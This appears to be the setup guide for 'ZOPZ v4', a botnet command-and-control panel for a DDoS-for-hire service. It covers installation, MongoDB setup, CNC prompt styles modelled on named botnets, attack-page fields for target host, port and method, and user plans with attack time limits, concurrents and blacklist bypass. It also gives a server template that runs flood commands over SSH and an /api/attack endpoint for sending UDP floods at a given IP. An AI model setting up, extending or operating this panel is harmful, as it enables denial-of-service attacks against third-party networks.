# ZOPZ v4 Setup Guide
This project sets up a Node.js-based SSH control and web management system
using PM2 for process management and MongoDB for backend storage.
---
### Suggested minimum server specs and details:
Operating System: `Ubuntu, Debian` - ether version is fine.
Ram: `2 Gb`
CPU: `1 core`
Storage: `10 Gb`, just due too what os you need.

### Installation Script
A bash script is included to automate the initial setup:

### Features:
- Generates a 4096-bit SSH RSA host key
- Installs **nvm** (Node Version Manager)
- Installs Node.js v18 and sets it as the default
- Installs `npm` dependencies and `pm2` globally

### Run Bash Script:
chmod +x setup.sh
./setup.sh
or:
bash install.sh

Colors:
[38;5;<color_code>m   - Set foreground text color (use color code 0-255)
[48;5;<color_code>m   - Set background color (use color code 0-255)
[<row>;<column>H      - Move cursor to row <row> and column <column>

### Tfx Commands:
name command.tfx, auto reload command = command

### Prompt UI:
Succubus CNC Prompt:
[38;5;39m╔═[[97m{username.user}[38;5;39m@[97mzopz[38;5;39m][97m
[38;5;39m╚════► [97m

SSN CNC Prompt:
[48;5;15m[38;5;33m {username.user} ● [38;5;33mzopz [0m ►► [97m

New Prompt:
[38;5;39m[[97m{username.user}[38;5;39m@[97mzopz[38;5;39m][97m: [97m

Gorilla Botnet Prompt:
[97m[[38;5;39m{username.user}[97m@zopz]:[38;5;39m~[97m$ [97m

*** you can add cnc name via "{cnc_name}" im well aware ssn had a bug with this lolz fuck space fr.***

### Attack Page TFX UI:
{result.target.host}         - Target
{result.target.port}         - Port
{command}                    - Method
{result.target.time_sent}    - Timesent

### Geo Info
{result.target.asn}          - ASN
{result.target.org}          - Org
{result.target.country_code} - country code

### how to add a server:
// same with other methods for raw or if you so deside too funnel other c2s too this cnc you can.
"name": "server1",
"host": "hostect",
"port": [
  22
],
"type": "ssh",
"username": "root",
"password": "passwd",
"command": "screen -dmS {{session}} ./home {{host}} -1 1 {{time}}"

### Other types of connection types:
ssh
telnet
raw 

### Title Page TFX UI:
{cnc_name}                   - CNC Name
{online}                     - Online users
{used_slots}                 - Total ongoing
{max_slots}                  - Max Slots Set - config.Maxslots
{expiry}                     - Per user expiry
{spinner}                    - Spinner bc yall be adding it sometimes.
{uptime}                     - shows the uptime of ur service.
{bots}                       - added a live botcount. must have 2 accounts.

### Account, Plan Info TFX:
{user.username}              - Username  
{user.password}              - Password  
{user.role}                  - Role  
{user.admin}                 - Admin  
{user.reseller}              - Reseller  
{user.vip}                   - VIP  
{user.expiry}                - Expiry  
{user.maxTime}               - Max Time  
{user.concurrents}           - Concurrents  
{user.cooldown}              - Cooldown  
{user.api}                   - API  
{user.spambypass}            - Spam Bypass  
{user.blacklistbypass}       - Blacklist Bypass  
{user.homeholder}            - Homeholder  
{user.banned}                - Banned
{clear}                      - clear page
<<$clear>>                   - clear page - SSN Support for inported users.
[8;24;80t                  - Auto Size Page

### MongoDB Server Setup & Configuration Free:
MongoDB Server Setup & Configuration (Free)

### Step 1:
Go to https://www.mongodb.com/cloud/atlas/register
Create an account.
Login Now!

### Step 2:
Go to the Clusters section and click "Create Cluster".
Choose the Free Tier cluster.
Select a region closest to your server for the best ping.

### Step 3:
Go to the Network Access tab and click "Add IP Address".
Select "Allow Access From Anywhere", then click Confirm.

### Step 4:
Go back to Clusters, then click "Connect" ? "Connect with Compass".
Copy the provided connection string (e.g.,
mongodb+srv://<username>:<db_password>@cluster0.r84ibih.mongodb.net/).

### Step 5:
To get your password:
Go to the Quickstart tab ? Click Edit, then set your desired password.
Replace <db_password> in the connection string with your chosen password.

### Step 6:
Open the MongoDB Compass app.
Click the "+" button to add a new connection.
Paste in the updated connection string and click Connect.

### Step 7:
After connecting, set the Database Name to "cnc" and the Collection Name to "users".
Example screenshot: https://ibb.co/jP5bwd2r

### Video Setup if manual:
https://streamable.com/tdiwsx

### Step 8:
 get ur login info too ur url, 2 connect via mongo compass, create folder in any place on "admin" inport the json file zopzc2.zopz.json
where it shows in main.json.
Note: it should already be setup on ur db but just for a example.

"mongo_db_name": "cnc",
"mongo_db_collection": "users",
then save it after ur done saving it then you resort too connecting and adding apis ect. enjoy!!!!!!

### Step 9: 
Forcing IPV4 now so run the following commands:
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1

### Step 10:
relogin too ssh, run commands:
cd ZOPZCNC
npm install pm2 -g
pm2 start index.js --name zopzcnc
pm2 startup
pm2 restart zopzcnc

### //how too log:
pm2 log

### API Docs:
GET /plan
http://localhost:3000/plan?username=user1&password=pass123

GET /admin/ongoing
http://localhost:3000/admin/ongoing?username=admin&password=adminpass

GET /api/attack - main.json = change it too what you want.
http://localhost:3000/api/attack?username=user1&password=pass123&host=1.2.3.4&port=80&time=60&method=UDP&len=128&concurrents=5

&concurrents= is not needed but if wanted too use more then 1 con ect without more then 1 url then you can.

GET /api/methods
http://localhost:3000/api/methods

### Website was added in EJS too send attacks along with dynamic listing,
### you can now list methods and send attacks, plan data and format ur own UI with no limits.
### there is a premade Ui already RCE was patched on /api/attack - now can customize the endpoint as you want.
### all vuln are patched with no hacks or breaches. enjoy thank you
### premade UI.
### api login reuqest.
### on startup after ur database is linked in main.json, it now auto creates ur login as root:root - no more imports